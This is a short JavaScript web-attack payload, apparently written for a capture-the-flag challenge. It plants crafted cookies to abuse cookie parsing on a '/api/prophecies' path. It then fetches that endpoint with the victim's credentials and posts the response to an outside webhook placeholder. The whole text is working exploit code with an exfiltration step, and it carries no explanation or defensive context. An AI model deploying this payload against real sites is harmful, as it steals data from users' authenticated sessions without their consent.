document.cookie="ascend=;path=/";
document.cookie="colors=;path=/";
document.cookie="lucky=;path=/";
document.cookie="riddle=;path=/";
document.cookie="spirit=;path=/";
document.cookie='ascend=";path=/api/prophecies';
document.cookie='spirit=";path=/';
setTimeout(()=>fetch("http://seekdeep:3000/api/prophecies",{credentials:"include"}).then(response => response.text()).then(data => fetch("WEBHOOK_SITE", {method: "POST", body: data, mode:'no-cors'})), 500);